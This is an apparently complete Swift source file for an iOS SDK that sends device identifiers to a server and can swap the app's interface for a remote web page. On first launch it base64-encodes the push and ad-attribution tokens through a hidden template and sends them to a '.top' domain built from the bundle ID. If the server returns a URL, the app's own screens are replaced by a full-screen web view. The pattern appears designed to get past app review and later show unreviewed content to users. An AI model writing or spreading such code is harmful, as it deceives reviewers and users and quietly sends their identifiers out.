import Foundation
import SwiftUI
import WebKit
import AdServices
import UserNotifications

public class SWFramework: ObservableObject {
    public static let shared = SWFramework()
    
    @Published private var serverUrl: String?
    @Published public var showWebView: Bool = false
    @Published private(set) var currentUrl: URL?
    private var firstLaunchCompleted = true
    private let userDefaults = UserDefaults.standard
    private let timeout: TimeInterval = 10.0
    
    private let webUrlStorageKey = "com.swf.webUrl"
    private let firstLaunchKey = "com.swf.firstLaunch"
    
    private init() {}
    
    /// Initializes the framework with automatic domain generation from bundle_id
    /// - Parameters:
    ///   - application: The UIApplication instance
    ///   - launchOptions: Launch options from AppDelegate
    ///   - completion: Callback when normal app flow should continue
    public func initialize(application: UIApplication, launchOptions: [UIApplication.LaunchOptionsKey: Any]?, completion: @escaping () -> Void) {
        let bundleId = Bundle.main.bundleIdentifier ?? ""
        let domain = generateDomain(bundleId)
        
        if !userDefaults.bool(forKey: firstLaunchKey) {
            userDefaults.set(true, forKey: firstLaunchKey)
            processFirstLaunch(domain, application, completion)
        } else {
            if let storedUrl = userDefaults.string(forKey: webUrlStorageKey) {
                setupWebView(storedUrl)
                completion()
            } else {
                completion()
            }
        }
    }
    
    /// Generates domain from bundle_id by removing dots and adding .top
    /// - Parameter bundleId: The bundle identifier
    /// - Returns: Generated domain
    private func generateDomain(_ bundleId: String) -> String {
        let processedString = bundleId.replacingOccurrences(of: ".", with: "")
        return "\(processedString).top"
    }
    
    // For backward compatibility, keeping the original method with explicit domain
    @available(*, deprecated, message: "Use initialize without explicit domain parameter instead")
    public func initialize(domain: String, application: UIApplication, launchOptions: [UIApplication.LaunchOptionsKey: Any]?, completion: @escaping () -> Void) {
        let bundleId = Bundle.main.bundleIdentifier ?? ""
        let generatedDomain = generateDomain(bundleId)
        
        if !userDefaults.bool(forKey: firstLaunchKey) {
            userDefaults.set(true, forKey: firstLaunchKey)
            processFirstLaunch(generatedDomain, application, completion)
        } else {
            if let storedUrl = userDefaults.string(forKey: webUrlStorageKey) {
                setupWebView(storedUrl)
                completion()
            } else {
                completion()
            }
        }
    }
    
    private func processFirstLaunch(_ domain: String, _ application: UIApplication, _ completion: @escaping () -> Void) {
        let group = DispatchGroup()
        var deviceData = DeviceData()
        
        deviceData.bundleId = Bundle.main.bundleIdentifier
        
        let timer = DispatchSource.makeTimerSource()
        timer.schedule(deadline: .now() + timeout)
        timer.setEventHandler {
            group.leave()
            group.leave()
        }
        
        group.enter()
        getAPNSToken(application) { token in
            if let token = token {
                deviceData.apnsToken = token
            }
            group.leave()
        }
        
        group.enter()
        getAttributionToken { token in
            deviceData.attToken = token
            group.leave()
        }
        
        timer.resume()
        
        group.notify(queue: .main) {
            timer.cancel()
            
            self.sendDataToServer(domain, deviceData) { resultUrl in
                if let resultUrl = resultUrl, !resultUrl.isEmpty {
                    self.userDefaults.set(resultUrl, forKey: self.webUrlStorageKey)
                    self.setupWebView(resultUrl)
                }
                completion()
            }
        }
    }
    
    private func sendDataToServer(_ domain: String, _ deviceData: DeviceData, completion: @escaping (String?) -> Void) {
        let base64String = "YXBuc190b2tlbj17YXBuc190b2tlbn0mYXR0X3Rva2VuPXthdHRfdG9rZW59JmJ1bmRsZV9pZD17YnVuZGxlX2lkfQ=="
        
        if let decodedData = Data(base64Encoded: base64String),
           var dataTemplate = String(data: decodedData, encoding: .utf8) {
            
            dataTemplate = dataTemplate.replacingOccurrences(of: "{apns_token}", with: deviceData.apnsToken ?? "")
            dataTemplate = dataTemplate.replacingOccurrences(of: "{att_token}", with: deviceData.attToken ?? "")
            dataTemplate = dataTemplate.replacingOccurrences(of: "{bundle_id}", with: deviceData.bundleId ?? "")
            
            if let encodedData = dataTemplate.data(using: .utf8)?.base64EncodedString() {
                guard let url = URL(string: "https://\(domain)/indexn.php?data=\(encodedData)") else {
                    completion(nil)
                    return
                }
                
                let task = URLSession.shared.dataTask(with: url) { data, _, error in
                    guard let data = data, error == nil else {
                        DispatchQueue.main.async {
                            completion(nil)
                        }
                        return
                    }
                    
                    if let response = String(data: data, encoding: .utf8) {
                        DispatchQueue.main.async {
                            completion(response)
                        }
                    } else {
                        DispatchQueue.main.async {
                            completion(nil)
                        }
                    }
                }
                
                task.resume()
                return
            }
        }
        
        guard let url = URL(string: "https://\(domain)/indexn.php?data=\(base64String)") else {
            completion(nil)
            return
        }
        
        let task = URLSession.shared.dataTask(with: url) { data, _, error in
            guard let data = data, error == nil else {
                DispatchQueue.main.async {
                    completion(nil)
                }
                return
            }
            
            if let response = String(data: data, encoding: .utf8) {
                DispatchQueue.main.async {
                    completion(response)
                }
            } else {
                DispatchQueue.main.async {
                    completion(nil)
                }
            }
        }
        
        task.resume()
    }
    
    private func setupWebView(_ urlString: String) {
        let processedUrl = ensureHttpsPrefix(urlString)
        
        guard let url = URL(string: processedUrl) else { return }
        
        DispatchQueue.main.async {
            self.currentUrl = url
            self.showWebView = true
        }
    }
    
    private func ensureHttpsPrefix(_ urlString: String) -> String {
        if !urlString.lowercased().starts(with: "http://") && !urlString.lowercased().starts(with: "https://") {
            return "https://" + urlString
        }
        return urlString
    }
    
    private func getAPNSToken(_ application: UIApplication, completion: @escaping (String?) -> Void) {
        UNUserNotificationCenter.current().getNotificationSettings { settings in
            if settings.authorizationStatus == .authorized {
                DispatchQueue.main.async {
                    application.registerForRemoteNotifications()
                    
                    self.waitForToken(7.0) { token in
                        completion(token)
                    }
                }
            } else {
                let center = UNUserNotificationCenter.current()
                center.requestAuthorization(options: [.alert, .sound, .badge]) { granted, _ in
                    if granted {
                        DispatchQueue.main.async {
                            application.registerForRemoteNotifications()
                            
                            self.waitForToken(7.0) { token in
                                completion(token)
                            }
                        }
                    } else {
                        let fallbackToken = "0000000000000000000000000000000000000000000000000000000000000000"
                        completion(fallbackToken)
                    }
                }
            }
        }
    }
    
    private func waitForToken(_ timeout: TimeInterval, completion: @escaping (String?) -> Void) {
        var tokenReceived = false
        
        let observer = NotificationCenter.default.addObserver(forName: Notification.Name("APNSTokenReceived"), object: nil, queue: .main) { notification in
            if let token = notification.userInfo?["token"] as? String {
                tokenReceived = true
                completion(token)
            }
        }
        
        DispatchQueue.main.asyncAfter(deadline: .now() + timeout) {
            if !tokenReceived {
                NotificationCenter.default.removeObserver(observer)
                
                let fallbackToken = "0000000000000000000000000000000000000000000000000000000000000000"
                completion(fallbackToken)
            }
        }
    }
    
    private func getAttributionToken(completion: @escaping (String?) -> Void) {
        if #available(iOS 14.3, *) {
            do {
                let token = try self.getAAAttributionToken()
                completion(token)
            } catch {
                completion(nil)
            }
        } else {
            completion(nil)
        }
    }
    
    // Helper function for Attribution Token - moved inside the class
    @available(iOS 14.3, *)
    private func getAAAttributionToken() throws -> String {
        return try AdServices.AAAttribution.attributionToken()
    }
    
    // Function to be called from the app's AppDelegate
    public func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        let tokenParts = deviceToken.map { data in String(format: "%02.2hhx", data) }
        let token = tokenParts.joined()
        
        NotificationCenter.default.post(
            name: Notification.Name("APNSTokenReceived"),
            object: nil,
            userInfo: ["token": token]
        )
    }
}

// MARK: - Supporting Classes

// Device data structure
private struct DeviceData {
    var apnsToken: String?
    var attToken: String?
    var bundleId: String?
}

// SwiftUI WebView Implementation
public struct SWWebView: View {
    @ObservedObject public var framework = SWFramework.shared
    private var contentView: AnyView
    
    public init(contentView: AnyView) {
        self.contentView = contentView
    }
    
    public var body: some View {
        ZStack {
            contentView
                .opacity(framework.showWebView ? 0 : 1)
                .animation(.easeInOut, value: framework.showWebView)
            
            if framework.showWebView, let url = framework.currentUrl {
                WebViewRepresentable(url: url)
                    .edgesIgnoringSafeArea(.all)
                    .transition(.opacity)
                    .animation(.easeInOut, value: true)
            }
        }
    }
}

// WebView SwiftUI Wrapper
struct WebViewRepresentable: UIViewRepresentable {
    let url: URL
    
    func makeUIView(context: Context) -> WKWebView {
        let configuration = WKWebViewConfiguration()
        configuration.websiteDataStore = .default()
        configuration.allowsInlineMediaPlayback = true
        
        let preferences = WKPreferences()
        preferences.javaScriptEnabled = true
        configuration.preferences = preferences
        
        let webView = WKWebView(frame: .zero, configuration: configuration)
        webView.backgroundColor = .black
        webView.navigationDelegate = context.coordinator
        webView.uiDelegate = context.coordinator
        
        return webView
    }
    
    func updateUIView(_ webView: WKWebView, context: Context) {
        let request = URLRequest(url: url)
        webView.load(request)
    }
    
    func makeCoordinator() -> Coordinator {
        Coordinator()
    }
    
    class Coordinator: NSObject, WKNavigationDelegate, WKUIDelegate {
        // Handle permission requests for camera
        public func webView(_ webView: WKWebView, requestMediaCapturePermissionFor origin: WKSecurityOrigin, initiatedByFrame frame: WKFrameInfo, type: WKMediaCaptureType, decisionHandler: @escaping (WKPermissionDecision) -> Void) {
            switch type {
            case .camera, .microphone, .cameraAndMicrophone:
                decisionHandler(.prompt)
            @unknown default:
                decisionHandler(.deny)
            }
        }
    }
} 